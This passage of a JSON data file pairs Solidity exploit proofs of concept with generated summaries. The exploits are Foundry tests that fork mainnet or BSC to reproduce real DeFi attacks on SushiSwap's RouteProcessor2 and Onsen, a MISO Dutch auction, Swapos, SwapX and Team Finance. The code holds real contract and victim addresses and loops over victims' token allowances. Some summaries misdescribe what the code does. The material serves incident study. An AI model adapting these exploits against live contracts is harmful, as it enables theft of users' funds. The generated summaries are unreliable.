address[](3);\n        path[0] = address(WETH);\n        path[1] = address(wethBridgeToken);\n        path[2] = address(nonWethBridgeToken);\n        uint256[] memory swapAmounts =\n            sushiRouter.swapExactTokensForTokens(\n                0.001 ether / 2,\n                0,\n                path,\n                address(this),\n                type(uint256).max\n            );\n        uint256 nonWethBridgeAmount = swapAmounts[2];\n\n        // create DIGG<>WETH\n        pair = IUniswapV2Pair(\n            sushiFactory.createPair(address(nonWethBridgeToken), address(WETH))\n        );\n\n        // add liquidity\n        nonWethBridgeToken.approve(address(sushiRouter), nonWethBridgeAmount);\n        sushiRouter.addLiquidity(\n            address(WETH),\n            address(nonWethBridgeToken),\n            0.001 ether / 2, // rest of WETH\n            swapAmounts[2], // all tokens we received\n            0,\n            0,\n            address(this),\n            type(uint256).max\n        );\n    }\n\n    function rugPull() public payable {\n        // redeem LP tokens for underlying\n        IERC20 otherToken = IERC20(wethPair.token0()); // DIGG\n        if (address(otherToken) == address(WETH)) {\n            otherToken = IERC20(wethPair.token1());\n        }\n        uint256 lpToWithdraw = wethPair.balanceOf(address(this));\n        wethPair.approve(address(sushiRouter), lpToWithdraw);\n        sushiRouter.removeLiquidity(\n            address(WETH),\n            address(otherToken),\n            lpToWithdraw,\n            0,\n            0,\n            address(this),\n            type(uint256).max\n        );\n\n        // trade otherToken -> wethBridgeToken -> WETH\n        uint256 otherTokenBalance = otherToken.balanceOf(address(this));\n        otherToken.approve(address(sushiRouter), otherTokenBalance);\n        address[] memory path = new address[](3);\n        path[0] = address(otherToken);\n        path[1] = address(wethBridgeToken);\n        path[2] = address(WETH);\n\n        sushiRouter.swapExactTokensForTokens(\n            otherTokenBalance,\n            0,\n            path,\n            address(this),\n            type(uint256).max\n        );\n    }\n\n    receive() external payable {}\n}\n\n/* -------------------- Interface -------------------- */\ninterface IERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IWETH {\n    function deposit() external payable;\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address guy, uint256 wad) external returns (bool);\n    function withdraw(uint256 wad) external;\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\n\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint256 amountA, uint256 amountB);\n}\n\ninterface IUniswapV2Pair {\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address) external view returns (uint256);\n    function skim(address to) external;\n    function sync() external;\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;\n\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n}\n\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface ISushiMaker {\n    function convert(address x, address y) external view returns (uint256);\n}",
        "summary": "The code is an incomplete proof-of-concept exploit for a vulnerability found in Sushiswap's Onsen. The vulnerability allowed an attacker to add liquidity to a fake pair, acquire LP tokens, and then redeem those LP tokens for the underlying assets. The attacker could then convert one of the assets to SUSHI and send it to the SushiBar, effectively stealing funds from the system. The code imports several Solidity interfaces and implements a `testHack` function to execute the exploit.",
        "id": "58957224-148f-4e74-9dd3-9ba7aad2d59d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IDutchAuction {\n  function commitEth(\n    address payable _beneficiary,\n    bool readAndAgreedToMarketParticipationAgreement\n  ) external payable;\n\n  function batch(bytes[] calldata calls, bool revertOnFail)\n    external\n    payable\n    returns (bool[] memory successes, bytes[] memory results);\n}\n\ncontract ContractTest is DSTest {\n  IDutchAuction DutchAuction =\n    IDutchAuction(0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e);\n  IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n  bytes[] public data;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 13038771); //fork mainnet at block 13038771\n  }\n\n  function testExploit() public {\n    payable(address(0)).transfer(79228162414264337593543950335);\n    emit log_named_uint(\n      \"Before exploit, ETH balance of attacker:\",\n      address(address(this)).balance\n    );\n    emit log_named_uint(\n      \"Before exploit, ETH balance of DutchAuction:\",\n      address(DutchAuction).balance\n    );\n    bytes memory payload = abi.encodePacked(\n      DutchAuction.commitEth.selector,\n      uint256(uint160(address(this))),\n      uint256(uint8(0x01))\n    );\n    data.push(payload);\n    data.push(payload);\n    data.push(payload);\n    data.push(payload);\n    data.push(payload);\n    DutchAuction.batch{ value: 100000000000000000000 }(data, true);\n    emit log_named_uint(\n      \"After exploit, ETH balance of attacker:\",\n      address(address(this)).balance\n    );\n    emit log_named_uint(\n      \"After exploit, ETH balance of DutchAuction:\",\n      address(DutchAuction).balance\n    );\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity contract that tests an exploit on a Dutch auction contract interface (IDutchAuction). The exploit is performed by calling the commitEth function repeatedly through the batch function with a specific payload that results in sending a large amount of ETH to the contract address. The contract also uses the IERC20 interface to interact with the WETH token, and includes a CheatCodes contract which is used to create and interact with blockchain forks for testing purposes. Overall, this contract serves as a demonstration of how the exploit could be performed and helps to test the robustness of the Dutch auction contract against such attacks.",
        "id": "fda28fbd-3f9a-435f-bdc2-7b808a2ae2f9"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1644907207530774530\n// https://twitter.com/SlowMist_Team/status/1644936375924584449\n// https://twitter.com/AnciliaInc/status/1644925421006520320\n// @TX\n// https://library.dedaub.com/ethereum/tx/0x04b166e7b4ab5105a8e9c85f08f6346de1c66368687215b0e0b58d6e5002bc32\n// @Summary\n// Sushi RouteProcessor2 does not check user input `route` carefully.\n\n\n\n\ninterface IUniswapV3Pool {\n  function swap(\n    address recipient,\n    bool zeroForOne,\n    int256 amountSpecified,\n    uint160 sqrtPriceLimitX96,\n    bytes calldata data\n  ) external returns (int256 amount0, int256 amount1);\n}\n\ninterface IRouteProcessor2 {\n    function processRoute(\n    address tokenIn,\n    uint256 amountIn,\n    address tokenOut,\n    uint256 amountOutMin,\n    address to,\n    bytes memory route\n  ) external payable returns (uint256 amountOut);\n\n  function uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n  ) external;\n\n  function tridentCLSwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n  ) external;\n}\n//original route 0x01514910771af9ca656af840dff83e8264ecf986ca01000001f9a001d5b2c7c5e45693b41fcf931b94e680cac4000000000000000000000000000000000000000000\n// my route      0x01514910771af9ca656af840dff83e8264ecf986ca010000017fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000\ncontract SushiExp is Test, IUniswapV3Pool {\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);\n    address victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;\n    IRouteProcessor2 processor = IRouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_007_841);\n\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(LINK), \"LINK\");\n    }\n\n    function testExp() external {\n        uint8 commandCode = 1;\n        uint8 num = 1;\n        uint16 share = 0;\n        uint8 poolType = 1;\n        address pool = address(this);\n        uint8 zeroForOne = 0;\n        address recipient = address(0);\n        bytes memory route = abi.encodePacked(\n          commandCode,\n          address(LINK),\n          num,\n          share,\n          poolType,\n          pool,\n          zeroForOne,\n          recipient\n        );\n        console.log(\"WETH balance before attack: %d\\n\", WETH.balanceOf(address(this)));\n\n        processor.processRoute(\n          0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, //native token\n          0,\n          0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,\n          0,\n          0x0000000000000000000000000000000000000000,\n          route\n        );\n\n        console.log(\"WETH balance after  attack: %d\\n\", WETH.balanceOf(address(this)));\n    }\n\n    \n\n  function swap(\n    address recipient,\n    bool zeroForOne,\n    int256 amountSpecified,\n    uint160 sqrtPriceLimitX96,\n    bytes calldata data\n  ) external returns (int256 amount0, int256 amount1) {\n    \n    amount0 = 0;\n    amount1 = 0;\n    bytes memory malicious_data = abi.encode(address(WETH), victim);\n      processor.uniswapV3SwapCallback(\n        100 * 10 ** 18,\n        0,\n        malicious_data\n      );\n  }\n}\n",
        "summary": "This Solidity code defines a contract called `SushiExp` that aims to exploit a vulnerability found in the SushiSwap's `RouteProcessor2` contract. The `SushiExp` contract includes an interface for the `UniswapV3Pool` contract and two other interfaces for the targeted `RouteProcessor2` contract. \n\nThe `setUp()` function initializes the contract and sets up a test network. The `testExp()` function defines a malicious `route` and executes it through the `processRoute()` function of the `RouteProcessor2` contract. \n\nThe `swap()` function is called when a swap is executed with the `UniswapV3Pool` contract. Its purpose is to exploit the vulnerability in the `RouteProcessor2` contract by calling its `uniswapV3SwapCallback()` function with some malicious data.",
        "id": "fc942dc5-feae-432b-a827-f36a7c6bc216"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n\n// @Analysis\n// https://twitter.com/CertiKAlert/status/1647530789947469825\n// https://twitter.com/BeosinAlert/status/1647552192243728385\n// @TX\n// https://etherscan.io/address/0x2df07c054138bf29348f35a12a22550230bd1405\n\n// @Contract\n\ninterface SWAPOS {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ninterface IWETH {\n    function deposit() external payable;\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address guy, uint256 wad) external returns (bool);\n    function withdraw(uint256 wad) external;\n    function balanceOf(address) external view returns (uint256);\n}\n\ncontract ContractTest is Test {\n    SWAPOS swpToken = SWAPOS(0x09176F68003c06F190ECdF40890E3324a9589557);\n    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    SWAPOS swapPos = SWAPOS(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17057419);\n        cheats.label(address(WETH), \"weth\"); \n        cheats.label(address(swpToken), \"swpToken\"); \n    \n    }\n\n    function testExploit() external { \n        WETH.deposit{value: 3 ether}();  \n        WETH.transfer(address(swapPos), 10);\n        swapPos.swap(142658161144708222114663 ,0, address(this), \"\");\n        (uint _reserve0, uint _reserve1, uint32 _blockTimestampLast) = swapPos.getReserves();\n        emit log_named_decimal_uint(\"swapos balance\", _reserve0, 18);\n        emit log_named_decimal_uint(\"ETH balance\", _reserve1, 18);\n\n        }\n\n  \n\n    }\n\n\n\n",
        "summary": "This code is a Solidity smart contract that imports interfaces for two other contracts: SWAPOS and IWETH. It also imports the contract CheatCodes. The `setUp` function sets up the CheatCodes fork for the mainnet and labels addresses for the WETH and SWAPToken contracts. The `testExploit` function transfers 3 ether to the WETH contract, transfers 10 WETH tokens to the SWAPOS contract, and then calls the `swap` function on the SWAPOS contract with specific parameters. Finally, it logs the balances of SWAPOS and ETH.",
        "id": "f38e1b77-1b91-4f51-95f5-2b7ca43470a4"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1630111965942018049\n// https://twitter.com/peckshield/status/1630100506319413250\n// @TX\n// https://bscscan.com/tx/0x3ee23c1585474eaa4f976313cafbc09461abb781d263547c8397788c68a00160\n\ncontract ContractTest is Test {\n    address swapX = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01;\n    IERC20 DND = IERC20(0x34EA3F7162E6f6Ed16bD171267eC180fD5c848da);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);\n    address[] victims = [\n        0x0b70e2Abe6F1A056E23658aED1FF9EF9901CB2A3,\n        0x210C9E1d9E0572da30B2b8b9ca57E5e380528534,\n        0x6906f738daFD4Bf14d6e3e979d4Aaf980FF5392D,\n        0x708a34D4C5a7D7fd39eE4DB0593be18df58fd227,\n        0x48ba64b8CBd8BBcE086E8e8ECc6f4De34AA35D08,\n        0xBF57dea8e19022562F002Da6b7bbe2A2DB85c2c0,\n        0x4148b0B927cC8246f65AF9B77dfA84b60565820c,\n        0x57070188BAA313c73fffDbA43c0ABE17fbFB41f9,\n        0x08943873222CE63eC48f8907757928dcb06af388,\n        0x047252B87FB7ecb7e29F8026dd117EB8B8E6cF0f,\n        0x8C51b7BB3f64845912616914455517DF294A0d0B,\n        0x91243b8242f13299C5af661ef5d19bfE0D3bf024,\n        0xfe23ea0CEC98D54A677F4aD3082D64f8A0207eB7,\n        0x54D7AFCaF140fA45Ff5387f0f2954bC913c0796F,\n        0x76bf18aFED5AcCFd59525D10ce15C4B8Cb64370d,\n        0xe5d985b7b934dc0e0E1043Fc11f50ba9E229465C\n    ];\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_023_088);\n        cheats.label(address(swapX), \"swapX\");\n        cheats.label(address(DND), \"DND\");\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(Router), \"Router\");\n    }\n\n    function testExploit() external {\n        deal(address(DND), address(this), 1_000_000 * 1e18);\n        for (uint256 i; i < victims.length; ++i) {\n            uint256 transferAmount = BUSD.balanceOf(victims[i]);\n            if (BUSD.allowance(victims[i], swapX) < transferAmount) {\n                transferAmount = BUSD.allowance(victims[i], swapX);\n                if (transferAmount == 0) continue;\n            }\n            address[] memory swapPath = new address[](3);\n            swapPath[0] = address(BUSD);\n            swapPath[1] = address(WBNB);\n            swapPath[2] = address(DND);\n            uint256 value = 0;\n            uint24[] memory array = new uint24[](16);\n            array[0] = 65_536;\n            array[11] = 257;\n            swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));\n        }\n\n        DNDToWBNB();\n\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals()\n            );\n    }\n\n    function DNDToWBNB() internal {\n        DND.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(DND);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokens(DND.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n}\n",
        "summary": "This code is a Solidity smart contract that performs an exploit on a vulnerable contract called SwapX. It imports an interface and a testing library, defines some token addresses and an instance of a Uniswap V2 router, and creates an array of victim addresses. The `setUp` function is called before the exploit and it sets up cheats for a select fork named \"bsc\" and labels for the various token addresses and the router. \n\nThe core of the exploit happens in the `testExploit` function. It calls the `deal` function of the testing library to transfer 1 million DND tokens from the attacker address to this contract's address. Then, for each address in the `victims` array, it checks if there is a sufficient allowance of BUSD tokens for SwapX to access, and chooses the smaller of that allowance and the balance of BUSD tokens in the victim address. It calls the `swapX` contract with the `swapExactTokensForTokens` function to swap BUSD for DND via WBNB for the chosen amount of BUSD, passing in the necessary parameters and the victim address. The victim's tokens are swapped with the attacker's contract address receiving the swapped DND tokens. \n\nAfter all victims have been exploited, the `DNDToWBNB` function is called to exchange the received DND tokens for WBNB tokens, which is added to the attacker's balance. Finally, the `log_named_decimal_uint` event is emitted to log the attacker's WBNB balance after the exploit.",
        "id": "7ea8f669-e739-4946-89a9-6dd44862878c"
    },
    {
        "code": "\t// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : Multiple Tokens ~$15.8M US$\n// Root Cause : Lack of check function parameter legitimate\n// Attacker : 0x161cebb807ac181d5303a4ccec2fc580cc5899fd\n// Attack Contract : 0xcff07c4e6aa9e2fec04daaf5f41d1b10f3adadf4\n// Vulnerable Contract : https://etherscan.io/address/0x48d118c9185e4dbafe7f3813f8f29ec8a6248359#code#L1535\n// Attack Tx : https://etherscan.io/tx/0xb2e3ea72d353da43a2ac9a8f1670fd16463ab370e563b9b5b26119b2601277ce\n//     Pre-work1: lockToken()\n//       txId: https://etherscan.io/tx/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f\n//     Pre-work2: extendLockDuration()\n//       id 15324: https://etherscan.io/tx/0x2972f75d5926f8f948ab6a0cabc517a05f0da5b53e20f670591afbaa501aa436\n//       id 15325: https://etherscan.io/tx/0xec75bb553f50af37f8dd8f4b1e2bfe4703b27f586187741b91db770ad9b230cb\n//       id 15326: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4\n//       id 15327: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04\n//\n// @Analysis\n// Team Finance Official : https://twitter.com/TeamFinance_/status/1585770918873542656\n// PeckShield : https://twitter.com/peckshield/status/1585587858978623491\n// Solid Group : https://twitter.com/solid_group_1/status/1585643249305518083\n// Beiosin Alert : https://twitter.com/BeosinAlert/status/1585578499125178369\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant LockToken = 0xE2fE530C047f2d85298b07D9333C05737f1435fB;\n\n// Token address\naddress constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\naddress constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\naddress constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant caw = 0xf3b9569F82B18aEf890De263B84189bd33EBe452;\naddress constant tsuka = 0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD;\naddress constant selfmadeToken = 0x2d4ABfDcD1385951DF4317f9F3463fB11b9A31DF;\n                    // Create at https://etherscan.io/tx/0xa3cbbdd2494f6d5452de8edc5c8c32f316abc40140a63769a22e04cd2549963b\n\n// Pair address\naddress constant FEG_WETH_UniV2Pair = 0x854373387E41371Ac6E307A1F29603c6Fa10D872;\naddress constant USDC_CAW_UniV2Pair = 0x7a809081f991eCfe0aB2727C7E90D2Ad7c2E411E;\naddress constant USDC_TSUKA_UniV2Pair = 0x67CeA36eEB36Ace126A3Ca6E21405258130CF33C;\naddress constant KNDX_WETH_UniV2Pair = 0x9267C29e4f517cE9f6d603a15B50Aa47cE32278D;\n\n\n\ncontract Attacker is Test {\n    address[4] victims = [FEG_WETH_UniV2Pair, USDC_CAW_UniV2Pair, USDC_TSUKA_UniV2Pair, KNDX_WETH_UniV2Pair];\n    uint256[4] migrateId;// Will fill those from preWork()\n    uint160 constant newPriceX96 = 79210883607084793911461085816;\n                        // equal tick: -5,\n                        // equal price: 0.999563867\n                        // Can calculate it from: https://github.com/stakewithus/notes/blob/main/notebook/uniswap-v3/tick-and-sqrt-price-x-96.ipynb\n                        // And here: https://www.geogebra.org/solver?i=79210883607084793911461085816%3Dsqrt(x)*2%5E(96)\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15837893);\n        cheat.label(weth, \"WETH\");\n        cheat.label(usdc, \"USDC\");\n        cheat.label(dai, \"DAI\");\n        cheat.label(caw, \"CAW\");\n        cheat.label(tsuka, \"TSUKA\");\n        cheat.label(FEG_WETH_UniV2Pair, \"FEG/WETH Pair\");\n        cheat.label(USDC_CAW_UniV2Pair, \"USDC/CAW Pair\");\n        cheat.label(USDC_TSUKA_UniV2Pair, \"USDC/TSUKA Pair\");\n        cheat.label(KNDX_WETH_UniV2Pair, \"KNDX/WETH Pair\");\n        preWorks();\n        cheat.deal(address(this), 0); // set this balance is 0 to show effect\n        \n    }\n\n    // function 0xe0cec5b0\n    function preWorks() public payable {\n        uint256 _unlockTime = block.timestamp + 5;\n\n        // txId: https://etherscan.io/tx/0xe8f17ee00906cd0cfb61671937f11bd3d26cdc47c1534fedc43163a7e89edc6f\n        // Lock 4000000000 selfmadeToken, return 4 new NFT ID\n        for(uint i; i < 4; ++i){\n            uint256 nftId = ILockToken(LockToken).lockToken{value: 0.5 ether}(selfmadeToken, address(this), 1000000000, _unlockTime, false);\n            migrateId[i] = nftId;\n        }\n\n        // txId-1: https://etherscan.io/tx/0x2972f75d5926f8f948ab6a0cabc517a05f0da5b53e20f670591afbaa501aa436\n        // txId-2: https://etherscan.io/tx/0xec75bb553f50af37f8dd8f4b1e2bfe4703b27f586187741b91db770ad9b230cb\n        // txId-3: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4\n        // txId-4: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04\n        ILockToken(LockToken).extendLockDuration(migrateId[0], _unlockTime + 40000);\n        ILockToken(LockToken).extendLockDuration(migrateId[1], _unlockTime + 40000);\n        ILockToken(LockToken).extendLockDuration(migrateId[2], _unlockTime + 40000);\n        ILockToken(LockToken).extendLockDuration(migrateId[3], _unlockTime + 40000);\n    }\n\n    function testExploit() public {\n            IV3Migrator.MigrateParams memory parms;\n            uint256 _liquidityToMigrate;\n\n            emit log_named_decimal_uint(\"[Before] Attack Contract ETH balance\", address(this).balance, 18);\n            emit log_named_decimal_uint(\"[Before] Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)), 18);\n            emit log_named_decimal_uint(\"[Before] Attack Contract CAW balance\", IERC20(caw).balanceOf(address(this)), 18);\n            emit log_named_decimal_uint(\"[Before] Attack Contract TSUKA balance\", IERC20(tsuka).balanceOf(address(this)), 18);\n            \n            // The exploit code could be written like a for loop, but we keep it simple to let you could do some debugging here.\n            // ==================== Migrate FEG_WETH_UniV2Pair to V3 ====================\n            _liquidityToMigrate = IERC20(FEG_WETH_UniV2Pair).balanceOf(LockToken);\n            parms = IV3Migrator.MigrateParams({\n                pair: FEG_WETH_UniV2Pair,\n                liquidityToMigrate: _liquidityToMigrate,\n                percentageToMigrate: 1, // 1%\n                token0: selfmadeToken,\n                token1: weth,\n                fee: 500,\n                tickLower: -100,\n                tickUpper: 100,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: address(this),\n                deadline: block.timestamp,\n                refundAsETH: true\n            });\n\n            ILockToken(LockToken).migrate(migrateId[0], parms, true, newPriceX96, false);\n\n            //console.log(\"\\t[DEBUG]After migrated FEG_WETH_UniV2Pair, Attack Contract ETH balance\", address(this).balance);\n\n            // ==================== Migrate USDC_CAW_UniV2Pair to V3 ====================\n            _liquidityToMigrate = IERC20(USDC_CAW_UniV2Pair).balanceOf(LockToken);\n            parms = IV3Migrator.MigrateParams({\n                pair: USDC_CAW_UniV2Pair,\n                liquidityToMigrate: _liquidityToMigrate,\n                percentageToMigrate: 1,\n                token0: usdc,\n                token1: caw,\n                fee: 500,\n                tickLower: -100,\n                tickUpper: 100,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: address(this),\n                deadline: block.timestamp,\n                refundAsETH: true\n            });\n\n            ILockToken(LockToken).migrate(migrateId[1], parms, true, newPriceX96, false);\n\n            uint256 usdc_bal = IERC20(usdc).balanceOf(address(this));\n\n            if(usdc_bal > 0) {\n                swapUsdcToDai();\n            }\n\n            //console.log(\"\\t[DEBUG]After migrated USDC_CAW_UniV2Pair, Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)));\n            //console.log(\"\\t[DEBUG]After migrated USDC_CAW_UniV2Pair, Attack Contract CAW balance\", IERC20(caw).balanceOf(address(this)));\n\n            // ==================== Migrate USDC_TSUKA_UniV2Pair to V3 ====================\n            _liquidityToMigrate = IERC20(USDC_TSUKA_UniV2Pair).balanceOf(LockToken);\n            parms = IV3Migrator.MigrateParams({\n                pair: USDC_TSUKA_UniV2Pair,\n                liquidityToMigrate: _liquidityToMigrate,\n                percentageToMigrate: 1,\n                token0: usdc,\n                token1: tsuka,\n                fee: 500,\n                tickLower: -100,\n                tickUpper: 100,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: address(this),\n                deadline: block.timestamp,\n                refundAsETH: true\n            });\n            ILockToken(LockToken).migrate(migrateId[2], parms, true, newPriceX96, false);\n\n            usdc_bal = IERC20(usdc).balanceOf(address(this));\n\n            if(usdc_bal > 0) {\n                swapUsdcToDai();\n            }\n\n            //console.log(\"\\t[DEBUG]After migrated USDC_TSUKA_UniV2Pair, Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)));\n            //console.log(\"\\t[DEBUG]After migrated USDC_TSUKA_UniV2Pair, Attack Contract TSUKA balance\", IERC20(caw).balanceOf(address(this)));\n\n            //// ==================== Migrate KNDX_WETH_UniV2Pair to V3 ====================\n            _liquidityToMigrate = IERC20(KNDX_WETH_UniV2Pair).balanceOf(LockToken);\n            parms = IV3Migrator.MigrateParams({\n                pair: KNDX_WETH_UniV2Pair,\n                liquidityToMigrate: _liquidityToMigrate,\n                percentageToMigrate: 1,\n                token0: selfmadeToken,\n                token1: weth,\n                fee: 500,\n                tickLower: -100,\n                tickUpper: 100,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: address(this),\n                deadline: block.timestamp,\n                refundAsETH: true\n            });\n\n            ILockToken(LockToken).migrate(migrateId[3], parms, true, newPriceX96, false);\n\n            //console.log(\"\\t[DEBUG] After migrated KNDX_WETH_UniV2Pair, Attack Contract ETH balance\", address(this).balance);\n\n            // ===========================================================================\n\n            emit log_named_decimal_uint(\"[After] Attack Contract ETH balance\", address(this).balance, 18);\n            emit log_named_decimal_uint(\"[After] Attack Contract DAI balance\", IERC20(dai).balanceOf(address(this)), 18);\n            emit log_named_decimal_uint(\"[After] Attack Contract CAW balance\", IERC20(caw).balanceOf(address(this)), 18);\n            emit log_named_decimal_uint(\"[After] Attack Contract TSUKA balance\", IERC20(tsuka).balanceOf(address(this)), 18);\n    }\n\n    // Function 0xf9b65204\n    function swapUsdcToDai() private {\n        address curve_3pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;\n        uint256 usdc_bal = IERC20(usdc).balanceOf(address(this));\n        uint256 min_dy = usdc_bal / 100 * 98;\n        IERC20(usdc).approve(curve_3pool, type(uint256).max);\n        ICurvePool(curve_3pool).exchange(1, 0, usdc_bal, min_dy);\n    }\n\n\n    receive() external payable {} \n}\n\n/* -------------------- Interface -------------------- */\n\ninterface IV3Migrator {\n    struct MigrateParams {\n        address pair; // the Uniswap v2-compatible pair\n        uint256 liquidityToMigrate; // expected to be balanceOf(msg.sender)\n        uint8 percentageToMigrate; // represented as a numerator over 100\n        address token0;\n        address token1;\n        uint24 fee;\n        int24 tickLower;\n        int24 tickUpper;\n        uint256 amount0Min; // must be discounted by percentageToMigrate\n        uint256 amount1Min; // must be discounted by percentageToMigrate\n        address recipient;\n        uint256 deadline;\n        bool refundAsETH;\n    }\n}\n\ninterface ILockToken {\n    struct Items {\n        address tokenAddress;\n        address withdrawalAddress;\n        uint256 tokenAmount;\n        uint256 unlockTime;\n        bool withdrawn;\n    }\n\n    function migrate(\n        uint256 _id,\n        IV3Migrator.MigrateParams calldata params,\n        bool noLiquidity,\n        uint160 sqrtPriceX96,\n        bool _mintNFT\n    ) external payable;\n\n    \n    //function lockedToken(uint256) external returns(Items memory);\n\n    function lockToken(\n        address _tokenAddress,\n        address _withdrawalAddress,\n        uint256 _amount,\n        uint256 _unlockTime,\n        bool _mintNFT\n    ) external payable returns (uint256 _id);\n\n    function extendLockDuration(\n        uint256 _id,\n        uint256 _unlockTime\n    ) external;\n}\n\n",
